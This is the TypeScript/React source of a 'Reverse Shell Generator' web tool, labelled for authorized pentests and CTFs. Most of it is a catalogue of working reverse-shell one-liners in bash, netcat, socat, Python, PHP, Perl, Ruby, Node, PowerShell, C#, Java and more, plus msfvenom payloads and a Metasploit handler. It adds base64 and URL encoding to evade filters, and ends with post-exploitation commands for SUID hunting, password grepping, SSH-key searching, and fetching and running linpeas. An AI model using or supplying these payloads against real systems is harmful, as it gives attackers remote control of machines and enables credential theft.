"use client";

import { useMemo, useState } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCheck, faCopy, faSearch } from "@fortawesome/free-solid-svg-icons";
import { useCopy } from "@/lib/mdx-ui";
import { TYPOGRAPHY, COLORS } from "@/lib/design-tokens";
import ToolHelp from "@/components/tools/ToolHelp";
import { useLocalState } from "@/lib/useLocalState";

interface ShellTemplate {
  id: string;
  label: string;
  category: string;
  command: string;
}

const SHELLS: ShellTemplate[] = [
  { id: "bash-i", label: "Bash -i", category: "Bash", command: "bash -i >& /dev/tcp/{ip}/{port} 0>&1" },
  { id: "bash-196", label: "Bash 196", category: "Bash", command: "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196" },
  { id: "bash-read", label: "Bash read loop", category: "Bash", command: "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done" },
  { id: "sh", label: "sh", category: "Bash", command: "sh -i >& /dev/tcp/{ip}/{port} 0>&1" },
  { id: "ksh", label: "ksh", category: "Bash", command: "ksh -c 'ksh -i > /dev/tcp/{ip}/{port} 0<&1 2>&1'" },
  { id: "zsh", label: "zsh", category: "Bash", command: "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'" },

  { id: "nc-e", label: "netcat -e", category: "Netcat & socat", command: "nc {ip} {port} -e /bin/sh" },
  { id: "nc-c", label: "netcat -c", category: "Netcat & socat", command: "nc -c sh {ip} {port}" },
  { id: "ncat", label: "ncat", category: "Netcat & socat", command: "ncat {ip} {port} -e /bin/sh" },
  { id: "mkfifo", label: "netcat mkfifo", category: "Netcat & socat", command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f" },
  { id: "busybox", label: "busybox nc", category: "Netcat & socat", command: "busybox nc {ip} {port} -e sh" },
  { id: "socat", label: "socat EXEC", category: "Netcat & socat", command: "socat TCP:{ip}:{port} EXEC:/bin/sh" },
  { id: "socat-pty", label: "socat fully interactive", category: "Netcat & socat", command: "socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane" },

  { id: "python3", label: "Python 3", category: "Python", command: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
  { id: "python2", label: "Python 2", category: "Python", command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },

  { id: "php-exec", label: "PHP exec", category: "PHP", command: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
  { id: "php-system", label: "PHP system", category: "PHP", command: "php -r 'system(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\");'" },

  { id: "perl", label: "Perl", category: "Perl & Ruby", command: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
  { id: "ruby", label: "Ruby", category: "Perl & Ruby", command: "ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },

  { id: "node", label: "Node.js", category: "Node, Lua & Go", command: "node -e \"(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh');var c=new net.Socket();c.connect({port},'{ip}',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})();\"" },
  { id: "lua", label: "Lua", category: "Node, Lua & Go", command: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"" },
  { id: "golang", label: "Golang", category: "Node, Lua & Go", command: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" },
  { id: "awk", label: "Awk", category: "Node, Lua & Go", command: "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c) } } while(c != \"exit\") }}' /dev/null" },

  { id: "powershell", label: "PowerShell TCP", category: "Windows", command: "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()\"" },
  { id: "powershell-b64", label: "PowerShell encoded", category: "Windows", command: "powershell -nop -e <base64-of-the-command-above>" },
  { id: "csharp", label: "C# (csc)", category: "Windows", command: "using System;using System.Diagnostics;using System.Net.Sockets;class P{static void Main(){var c=new TcpClient(\"{ip}\",{port});var s=c.GetStream();var e=new Process();e.StartInfo.FileName=\"cmd.exe\";e.StartInfo.RedirectStandardInput=true;e.StartInfo.RedirectStandardOutput=true;e.StartInfo.UseShellExecute=false;e.Start();var r=new System.IO.StreamReader(e.StandardOutput.BaseStream);while(true){if(s.DataAvailable){var b=new byte[1024];int k=s.Read(b,0,1024);e.StandardInput.Write(System.Text.Encoding.Default.GetString(b,0,k));e.StandardInput.Flush();}if(r.Peek()>0){var l=r.ReadLine();var w=System.Text.Encoding.Default.GetBytes(l+\"\\n\");s.Write(w,0,w.Length);s.Flush();}}}}" },

  { id: "java", label: "Java", category: "Java & friends", command: "Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'\"); p.waitFor();" },
  { id: "groovy", label: "Groovy", category: "Java & friends", command: "String host=\"{ip}\"; int port={port}; Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);} p.destroy();s.close();" },

  { id: "telnet", label: "Telnet", category: "Other", command: "TF=$(mktemp -u);mkfifo $TF;telnet {ip} {port} 0<$TF | /bin/sh 1>$TF" },
  { id: "openssl", label: "OpenSSL", category: "Other", command: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s" },
  { id: "xterm", label: "xterm (X11)", category: "Other", command: "xterm -display {ip}:1" },

  { id: "pty-python3", label: "python3 pty spawn", category: "Stabilize a shell", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
  { id: "pty-script", label: "script (no python)", category: "Stabilize a shell", command: "script -qc /bin/bash /dev/null" },
  { id: "pty-term", label: "fix TERM", category: "Stabilize a shell", command: "export TERM=xterm-256color" },
  { id: "pty-size", label: "fix window size", category: "Stabilize a shell", command: "stty rows 45 cols 180" },
  { id: "pty-rlwrap", label: "rlwrap listener (your side)", category: "Stabilize a shell", command: "rlwrap -cAr nc -lvnp {port}" },
  { id: "pty-socat", label: "socat fully interactive", category: "Stabilize a shell", command: "socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane" },

  { id: "msf-elf", label: "msfvenom Linux ELF", category: "msfvenom", command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf" },
  { id: "msf-exe", label: "msfvenom Windows EXE", category: "msfvenom", command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe" },
  { id: "msf-php", label: "msfvenom PHP", category: "msfvenom", command: "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw -o shell.php" },
  { id: "msf-war", label: "msfvenom WAR", category: "msfvenom", command: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war" },
  { id: "msf-handler", label: "metasploit handler", category: "msfvenom", command: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; run'" },
];

const ENCODINGS = [
  { id: "none", label: "None" },
  { id: "base64", label: "Base64" },
  { id: "url", label: "URL" },
];

const STABILIZE_STEPS = [
  { n: "01", text: "Catch any shell from the list above. It will look broken: no prompt, no arrow keys, Ctrl+C kills it." },
  { n: "02", text: "Spawn a real PTY inside it. python3 is the usual route:", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
  { n: "03", text: "No python on the box? script works on almost every Linux:", command: "script -qc /bin/bash /dev/null" },
  { n: "04", text: "Press Ctrl+Z to background the shell. Then, in your own terminal, stop your local terminal from eating the keys:", command: "stty raw -echo; fg" },
  { n: "05", text: "Press Enter twice to get the prompt back, then set a sane terminal type:", command: "export TERM=xterm-256color" },
  { n: "06", text: "Match the window size. Run stty size locally and use those two numbers:", command: "stty rows 45 cols 180" },
  { n: "07", text: "Verify: clear should wipe the screen, Tab should autocomplete, and vim should not look like a ransom note." },
];

const CTF_WINS = [
  { label: "SUID binaries", command: "find / -perm -4000 -type f 2>/dev/null" },
  { label: "Capabilities", command: "getcap -r / 2>/dev/null" },
  { label: "sudo rights", command: "sudo -l" },
  { label: "Cron jobs", command: "cat /etc/crontab; ls -la /etc/cron.*" },
  { label: "Writable directories", command: "find / -writable -type d 2>/dev/null | grep -v proc" },
  { label: "Juicy files", command: "find / -name 'id_rsa' -o -name '*.bak' -o -name '*.zip' 2>/dev/null | head" },
  { label: "Recon triple", command: "id; uname -a; hostname; ip a" },
  { label: "Listening services", command: "ss -tulpn 2>/dev/null || netstat -tulpn" },
  { label: "Password grep", command: "grep -rI 'password' /var/www /etc 2>/dev/null | head" },
  { label: "Serve a file to the box", command: "python3 -m http.server 8000" },
  { label: "Pull and run linpeas", command: "wget http://{ip}:8000/linpeas.sh -O /tmp/l.sh && chmod +x /tmp/l.sh && /tmp/l.sh" },
  { label: "Base64 the payload", command: "base64 -w0 linpeas.sh" },
  { label: "vi shell escape", command: ":!/bin/sh" },
  { label: "less shell escape", command: "!/bin/sh" },
  { label: "awk shell escape", command: "awk 'BEGIN {system(\"/bin/sh\")}'" },
  { label: "Find an interpreter", command: "which nc ncat socat python python3 perl php busybox curl wget" },
];

export default function ReverseShellPage() {
  const [ip, setIp] = useLocalState("revshell-ip", "10.10.14.10");
  const [port, setPort] = useLocalState("revshell-port", "4444");
  const [shellId, setShellId] = useLocalState("revshell-shell", SHELLS[0].id);
  const [encoding, setEncoding] = useLocalState("revshell-encoding", "none");
  const [filter, setFilter] = useState("");
  const { copied, copy } = useCopy();
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const sub = (text: string) => text.replaceAll("{ip}", ip).replaceAll("{port}", port);

  const copyKey = (key: string, text: string) => {
    navigator.clipboard.writeText(sub(text));
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 1500);
  };

  const shell = SHELLS.find((item) => item.id === shellId) ?? SHELLS[0];

  const groups = useMemo(() => {
    const query = filter.trim().toLowerCase();
    const filtered = SHELLS.filter(
      (item) => !query || item.label.toLowerCase().includes(query) || item.category.toLowerCase().includes(query)
    );
    const byCategory: Record<string, ShellTemplate[]> = {};
    for (const item of filtered) {
      (byCategory[item.category] ??= []).push(item);
    }
    return byCategory;
  }, [filter]);

  const payload = useMemo(() => {
    const raw = shell.command.replaceAll("{ip}", ip).replaceAll("{port}", port);
    if (encoding === "base64") {
      try {
        return `echo ${btoa(raw)} | base64 -d | bash`;
      } catch {
        return raw;
      }
    }
    if (encoding === "url") {
      try {
        return encodeURIComponent(raw);
      } catch {
        return raw;
      }
    }
    return raw;
  }, [shell, ip, port, encoding]);

  const listener = shellId.startsWith("msf-")
    ? `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ${shell.category === "msfvenom" ? "linux/x64/shell_reverse_tcp" : "cmd/unix/reverse"}; set LHOST ${ip}; set LPORT ${port}; run'`
    : shellId === "powershell" || shellId === "csharp"
      ? `rlwrap -cAr nc -lvnp ${port}`
      : `nc -lvnp ${port}`;

  const inputClass = "w-full border-2 border-fg bg-surface px-3 py-2 font-mono text-sm text-fg focus:outline-none";
  const labelClass = "mb-1 block font-mono text-2xs uppercase text-fg-muted";

  return (
    <>
      <main className="min-h-screen flex-1 pt-16" style={{ backgroundColor: "var(--surf)" }}>
        <section className="mx-auto max-w-3xl px-6 py-16 md:px-12">
          <h1 className="mb-2 font-display text-4xl font-extrabold uppercase md:text-5xl" style={{ fontFamily: TYPOGRAPHY.fontDisplay, color: "var(--fg)" }}>
            Reverse Shell Generator
          </h1>
          <p className="mb-2 font-mono text-sm text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
            {SHELLS.length} payloads for authorized pentests and CTFs only
          </p>

          <ToolHelp
            intro="A reverse shell makes the target connect back to you, which usually beats a bind shell because outbound traffic is rarely filtered. The raw payloads give you a dumb shell — no prompt, no tab completion — so the last step is always to upgrade it to a real TTY."
            steps={[
              "Set LHOST to your machine's reachable IP and pick a port.",
              "Start the listener first (nc, rlwrap, or the metasploit handler below).",
              "Pick a payload that matches the target's interpreter, encode it if a filter needs it, and fire.",
              "Then run the TTY upgrade below — that is the step people forget.",
            ]}
            terms={[
              { term: "Reverse shell", meaning: "The target connects back to you. Works through outbound-only firewalls." },
              { term: "Bind shell", meaning: "The target listens and you connect in. Blocked by inbound firewalls more often." },
              { term: "Listener", meaning: "The netcat (or metasploit handler) you run to catch a reverse shell." },
              { term: "Dumb shell", meaning: "A raw pipe to sh: no job control, no tab completion, Ctrl+C kills it." },
              { term: "PTY", meaning: "A pseudo-terminal. Spawning one inside the shell is what makes it interactive." },
              { term: "Staged payload", meaning: "A tiny first stage that downloads the main payload — useful when space is limited." },
            ]}
            notes={[
              "Always start the listener before sending the payload, or you will miss the callback.",
              "If the target has no outbound access, a bind shell or an outbound channel on 443/53 is the way in.",
              "Encode the payload (base64 or URL) when quotes, spaces or ampersands are being filtered.",
              "Ctrl+C on a dumb shell kills your session — upgrade to a TTY before running anything interactive.",
            ]}
          />

          <div className="grid grid-cols-1 gap-4 border-2 border-fg bg-surface p-5 sm:grid-cols-2">
            <div>
              <label className={labelClass} style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                LHOST (your ip)
              </label>
              <input value={ip} onChange={(event) => setIp(event.target.value)} spellCheck={false} className={inputClass} style={{ fontFamily: TYPOGRAPHY.fontMono }} />
            </div>
            <div>
              <label className={labelClass} style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                LPORT (your listener)
              </label>
              <input value={port} onChange={(event) => setPort(event.target.value.replace(/[^0-9]/g, ""))} inputMode="numeric" spellCheck={false} className={inputClass} style={{ fontFamily: TYPOGRAPHY.fontMono }} />
            </div>
            <div className="sm:col-span-2">
              <label className={labelClass} style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                Encoding
              </label>
              <div className="flex flex-wrap gap-2">
                {ENCODINGS.map((item) => (
                  <button
                    key={item.id}
                    type="button"
                    onClick={() => setEncoding(item.id)}
                    aria-pressed={encoding === item.id}
                    className={`cursor-pointer border-2 px-3 py-1.5 font-mono text-2xs uppercase transition-colors ${encoding === item.id ? "border-fg bg-fg text-surface" : "border-fg-muted/40 text-fg-muted hover:border-fg hover:text-fg"}`}
                    style={{ fontFamily: TYPOGRAPHY.fontMono }}
                  >
                    {item.label}
                  </button>
                ))}
              </div>
            </div>
          </div>

          <div className="mt-6 border-2 border-fg">
            <div className="flex items-center gap-2 border-b-2 border-fg px-3 py-2">
              <FontAwesomeIcon icon={faSearch} className="text-[10px] text-fg-muted" aria-hidden />
              <input
                value={filter}
                onChange={(event) => setFilter(event.target.value)}
                placeholder="Filter payloads (bash, python, windows...)"
                spellCheck={false}
                className="min-w-0 flex-1 bg-transparent font-mono text-xs text-fg focus:outline-none"
                style={{ fontFamily: TYPOGRAPHY.fontMono }}
              />
              <span className="shrink-0 font-mono text-2xs uppercase text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                {Object.values(groups).reduce((total, list) => total + list.length, 0)}/{SHELLS.length}
              </span>
            </div>
            <div className="max-h-64 overflow-y-auto p-3">
              {Object.entries(groups).map(([category, items]) => (
                <div key={category} className="mb-3 last:mb-0">
                  <p className="mb-2 font-mono text-2xs uppercase text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontMono, letterSpacing: "0.12em" }}>
                    {category}
                  </p>
                  <div className="flex flex-wrap gap-2">
                    {items.map((item) => {
                      const active = shellId === item.id;
                      return (
                        <button
                          key={item.id}
                          type="button"
                          onClick={() => setShellId(item.id)}
                          aria-pressed={active}
                          className={`cursor-pointer border-2 px-3 py-1.5 font-mono text-2xs uppercase transition-colors ${active ? "border-fg bg-fg text-surface" : "border-fg-muted/40 text-fg-muted hover:border-fg hover:text-fg"}`}
                          style={{ fontFamily: TYPOGRAPHY.fontMono }}
                        >
                          {item.label}
                        </button>
                      );
                    })}
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="mt-6 border-2 border-fg">
            <div className="flex items-center gap-2 border-b-2 border-fg bg-fg px-3 py-2 text-surface">
              <span className="min-w-0 flex-1 truncate font-mono text-2xs uppercase" style={{ fontFamily: TYPOGRAPHY.fontMono, letterSpacing: "0.12em" }}>
                {shell.label}
              </span>
              <button
                type="button"
                onClick={() => copy(payload)}
                className="inline-flex shrink-0 cursor-pointer items-center gap-1.5 border border-current px-2 py-0.5 font-mono text-2xs uppercase transition-opacity hover:opacity-70"
                style={{ fontFamily: TYPOGRAPHY.fontMono, letterSpacing: "0.1em" }}
              >
                <FontAwesomeIcon icon={copied ? faCheck : faCopy} className="text-[10px]" aria-hidden />
                {copied ? "Copied" : "Copy"}
              </button>
            </div>
            <pre className="max-h-64 overflow-auto whitespace-pre-wrap break-all p-3 font-mono text-xs leading-relaxed text-fg" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
              {payload}
            </pre>
          </div>

          <div className="mt-4 border-2 border-fg p-4" style={{ backgroundColor: `color-mix(in srgb, ${COLORS.green} 10%, transparent)` }}>
            <span className="font-mono text-2xs uppercase" style={{ fontFamily: TYPOGRAPHY.fontMono, color: COLORS.green, letterSpacing: "0.12em" }}>
              start your listener first
            </span>
            <pre className="mt-2 overflow-auto font-mono text-sm text-fg" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
              {listener}
            </pre>
          </div>

          {/* TTY upgrade walkthrough */}
          <div className="mt-6 border-2 border-fg">
            <div className="flex flex-wrap items-center gap-2 border-b-2 border-fg bg-fg px-3 py-2 text-surface">
              <span className="font-mono text-2xs uppercase" style={{ fontFamily: TYPOGRAPHY.fontMono, letterSpacing: "0.12em" }}>
                Upgrade a dumb shell to a full TTY
              </span>
              <span className="flex-1" />
              <span className="font-mono text-2xs opacity-70" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                the step everyone forgets
              </span>
            </div>
            <ol>
              {STABILIZE_STEPS.map((step) => (
                <li key={step.n} className="flex gap-3 border-b border-fg-muted/15 p-3 last:border-b-0">
                  <span className="shrink-0 font-mono text-2xs" style={{ fontFamily: TYPOGRAPHY.fontMono, color: COLORS.pink }}>
                    {step.n}
                  </span>
                  <div className="min-w-0 flex-1">
                    <p className="font-sans text-sm leading-relaxed text-fg" style={{ fontFamily: TYPOGRAPHY.fontSans }}>
                      {step.text}
                    </p>
                    {step.command && (
                      <div className="mt-2 flex items-start gap-2">
                        <code className="min-w-0 flex-1 break-all border border-fg-muted/30 px-2 py-1 font-mono text-xs text-fg" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                          {sub(step.command)}
                        </code>
                        <button
                          type="button"
                          onClick={() => copyKey(step.n, step.command!)}
                          className="inline-flex shrink-0 cursor-pointer items-center gap-1 border border-fg-muted/40 px-2 py-1 font-mono text-2xs uppercase text-fg-muted transition-colors hover:border-fg hover:text-fg"
                          style={{ fontFamily: TYPOGRAPHY.fontMono }}
                        >
                          <FontAwesomeIcon icon={copiedKey === step.n ? faCheck : faCopy} className="text-[10px]" />
                          copy
                        </button>
                      </div>
                    )}
                  </div>
                </li>
              ))}
            </ol>
          </div>

          {/* CTF quick wins */}
          <div className="mt-6 border-2 border-fg">
            <div className="flex flex-wrap items-center gap-2 border-b-2 border-fg bg-fg px-3 py-2 text-surface">
              <span className="font-mono text-2xs uppercase" style={{ fontFamily: TYPOGRAPHY.fontMono, letterSpacing: "0.12em" }}>
                CTF quick wins
              </span>
              <span className="flex-1" />
              <span className="font-mono text-2xs opacity-70" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                copy, paste, move on
              </span>
            </div>
            <div className="divide-y divide-fg-muted/15">
              {CTF_WINS.map((item) => (
                <div key={item.label} className="flex flex-col gap-2 p-3 sm:flex-row sm:items-center">
                  <span className="w-48 shrink-0 font-mono text-2xs uppercase text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                    {item.label}
                  </span>
                  <code className="min-w-0 flex-1 break-all font-mono text-xs text-fg" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                    {sub(item.command)}
                  </code>
                  <button
                    type="button"
                    onClick={() => copyKey(item.label, item.command)}
                    className="inline-flex shrink-0 cursor-pointer items-center gap-1 border border-fg-muted/40 px-2 py-1 font-mono text-2xs uppercase text-fg-muted transition-colors hover:border-fg hover:text-fg"
                    style={{ fontFamily: TYPOGRAPHY.fontMono }}
                  >
                    <FontAwesomeIcon icon={copiedKey === item.label ? faCheck : faCopy} className="text-[10px]" />
                    copy
                  </button>
                </div>
              ))}
            </div>
          </div>

          <p className="mt-6 font-mono text-2xs uppercase text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
            For authorized security testing and CTF environments only.
          </p>
        </section>
      </main>
    </>
  );
}
